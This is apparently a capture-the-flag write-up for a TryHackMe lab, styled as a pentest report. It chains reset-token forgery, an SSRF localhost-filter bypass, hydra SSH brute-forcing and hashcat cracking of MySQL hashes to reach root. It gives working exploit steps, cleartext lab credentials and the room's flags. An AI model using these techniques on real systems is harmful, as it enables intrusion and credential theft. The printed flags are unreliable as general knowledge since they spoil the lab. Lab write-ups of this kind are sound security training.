Penetration Test Disclosure Report

TryHackMe Medium · May 31, 2026

Client: Clocky Corp Assessment Date: May 31, 2026 Classification: CONFIDENTIAL

1. Executive Summary

A penetration test was conducted against the target environment at 10.66.183.44. The assessment identified six security vulnerabilities that, when chained, allowed an unauthenticated attacker to achieve full remote compromise of the host as root. Initial access was gained by exploiting a predictable password reset token generation algorithm using time-based SHA1 token forgery. Administrative dashboard access revealed a Server-Side Request Forgery (SSRF) vulnerability that allowed exfiltration of a database backup file containing cleartext credentials. Reused credentials provided SSH access, and privilege escalation was achieved by cracking MySQL authentication hashes recovered from the database, yielding root-level access.

4. Detailed Findings

F-01: Sensitive Information Disclosure in robots.txt

Severity: Medium (CVSSv3: 5.3) Affected Component: http://10.66.183.44:8000/robots.txt

Description: The nginx web server on port 8000 exposes a robots.txt file that disallows crawlers from accessing files with .sql, .zip, and .bak extensions. This disclosure reveals the existence of sensitive file types on the server, guiding an attacker toward high-value targets. Additionally, the first flag was discovered directly within the robots.txt content.

Steps to Reproduce:

GET /robots.txt HTTP/1.1
Host: 10.66.183.44:8000

Response contains:

User-agent: *
Disallow: /*.sql$
Disallow: /*.zip$
Disallow: /*.bak$

Flag 1: THM{14b45bb9eefdb584b79063eca6a31b7a}

Impact: An attacker learns which file types may contain sensitive data and gains an initial foothold flag.

Recommendation: Remove flags and internal information from robots.txt. Restrict access to sensitive file types via proper access controls rather than relying on robots exclusion.

F-02: Sensitive Backup File Exposed on nginx

Severity: High (CVSSv3: 7.5) Affected Component: http://10.66.183.44:8000/index.zip

Description: A ZIP archive named index.zip is publicly accessible on the nginx server. This archive contains the full application source code (app.py) and a flag file. The source code reveals the application's internal logic, including the password reset token generation algorithm, database connection parameters, usernames, and a debug-enabled Flask application.

Steps to Reproduce:

$ wget http://10.66.183.44:8000/index.zip
$ unzip index.zip
  inflating: app.py
  extracting: flag2.txt

$ cat flag2.txt
THM{1d3d62de34a3692518d03ec474159eaf}

Impact: Full application source code disclosure allows an attacker to identify and exploit multiple vulnerabilities including the password reset token flaw and SSRF.

Recommendation: Remove backup and source archives from the web root. Implement directory-level access controls for sensitive file extensions.

F-03: Predictable Password Reset Token Generation

Severity: Critical (CVSSv3: 9.8) Affected Component: /forgot_password and /password_reset — Flask endpoints on port 8080

Description: The password reset mechanism generates a token by concatenating the current server timestamp with the username and hashing the result with SHA1:

value = datetime.datetime.now()
lnk = str(value)[:-4] + " . " + username.upper()
lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()

The timestamp is readable from the homepage (The current time is ...). The only unknown is the millisecond value (00–99), requiring a trivial brute-force of 100 possibilities. The username "administrator" was identified in the source code.

Steps to Reproduce:

  1. Trigger password reset for "administrator":
    2. POST /forgot_password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=administrator
  1. Extract server time from homepage response.
  1. Generate 100 tokens (milliseconds 00–99):
    2. for ms in range(100):
    lnk = f"{timestamp}.{ms:02d} . ADMINISTRATOR"
    token = hashlib.sha1(lnk.encode()).hexdigest()
  1. Brute-force the correct token via:
    2. GET /password_reset?token=<TOKEN> HTTP/1.1
  1. Set a new password via POST to /password_reset:
    2. POST /password_reset HTTP/1.1
Content-Type: application/x-www-form-urlencoded

password=P@ssw0rd123&token=<VALID_TOKEN>

Impact: An unauthenticated attacker can reset any known user's password and gain authenticated access to the administrative dashboard, exposing further attack surface.

Recommendation: Use cryptographically secure random token generation (e.g., secrets.token_urlsafe()). Never base tokens on predictable values like timestamps. Implement rate limiting on the password reset endpoint.

F-04: Server-Side Request Forgery (SSRF) in Admin Dashboard

Severity: High (CVSSv3: 8.8) Affected Component: /dashboard — POST location parameter

Description: The administrative dashboard provides a "Location" field that instructs the server to fetch a URL. The application filters requests containing localhost, 127, and 0.0.0.0 but can be bypassed using case variations (Localhost). This allows the attacker to make requests to internal services, including the Apache web server on port 80 which is otherwise inaccessible.

Steps to Reproduce:

Bypass the localhost filter and retrieve database.sql:

POST /dashboard HTTP/1.1
Content-Type: application/x-www-form-urlencoded

location=http://Localhost:80/database.sql

Response contains:

Flag 4: THM{350020dc1a53e50e1e92bac2c35dd0a2}

CREATE DATABASE IF NOT EXISTS clocky;
[...]
INSERT INTO passwords (password) VALUES ("Th1s_1s_4_v3ry_s3cur3_p4ssw0rd");

Impact: An authenticated attacker can enumerate internal services, read sensitive files from internal web servers, and exfiltrate database credentials.

Recommendation: Implement a strict allowlist of permitted URLs. Use a URL parser to normalize and validate the target host. Block all RFC 1918 addresses and hostname variations that resolve to localhost.

F-05: Hardcoded Credentials in Database Backup

Severity: High (CVSSv3: 7.5) Affected Component: /var/www/html/database.sql

Description: A database initialization script stored in the Apache web root contains cleartext credentials. The password Th1s_1s_4_v3ry_s3cur3_p4ssw0rd was found to be reused for the clarice user account on the SSH service.

Steps to Reproduce:

$ hydra -L users.txt -p "Th1s_1s_4_v3ry_s3cur3_p4ssw0rd" ssh://10.66.183.44
[STATUS] 16.67 tries/min
[22][ssh] host: 10.66.183.44   login: clarice   password: Th1s_1s_4_v3ry_s3cur3_p4ssw0rd

$ ssh clarice@10.66.183.44
clarice@ip-10-66-183-44:~$ cat flag5.txt
THM{e57dfa35e62d518cfd215dd7729d0877}

Impact: SSH access as user clarice providing a foothold on the internal host and access to the user's flag.

Recommendation: Store database initialization scripts outside the web root. Never reuse passwords across database and system accounts. Enforce unique passwords for every service and user.

F-06: MySQL Password Hash Cracking Leading to Privilege Escalation

Severity: High (CVSSv3: 8.0) Affected Component: MySQL mysql.user table

Description: The MySQL database is accessible with credentials discovered in /home/clarice/app/.env (clocky_user:seG3mY4F3tKCJ1Yj). This user has ALL PRIVILEGES ON *.* including access to the mysql.user table containing authentication hashes. The caching_sha2_password hashes can be extracted and converted to a hashcat-compatible format for cracking. The password armadillo was recovered for the dev MySQL user and reused for the root system account.

Steps to Reproduce:

  1. Connect to MySQL:
    2. $ mysql -u clocky_user -pseG3mY4F3tKCJ1Yj
  1. Extract hashes in hashcat-compatible format:
    2. SELECT CONCAT('$mysql',
  LEFT(authentication_string,6),
  '*',
  INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')
) AS hash
FROM mysql.user
WHERE plugin = 'caching_sha2_password'
  AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%'
  AND authentication_string != '';
  1. Crack with hashcat:
    2. $ hashcat -m 7401 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
$mysql$A$005*...*...:armadillo
  1. Escalate to root:
    2. clarice@ip-10-66-183-44:~$ su - root
Password: armadillo
root@ip-10-66-183-44:~# cat /root/flag6.txt
THM{6ad86ac1463ea8afbe0edd6cdd708f36}

Impact: Full root compromise of the target host. Attacker gains unrestricted access to all system resources.

Recommendation:

  • Grant MySQL users least privilege (no wildcard grants on *.*)
  • Use strong, unique passwords for all MySQL accounts
  • Do not reuse MySQL credentials for system accounts
  • Store environment variables securely with proper file permissions
  • Upgrade to MySQL 8.0+ with proper random_password or auth plugins
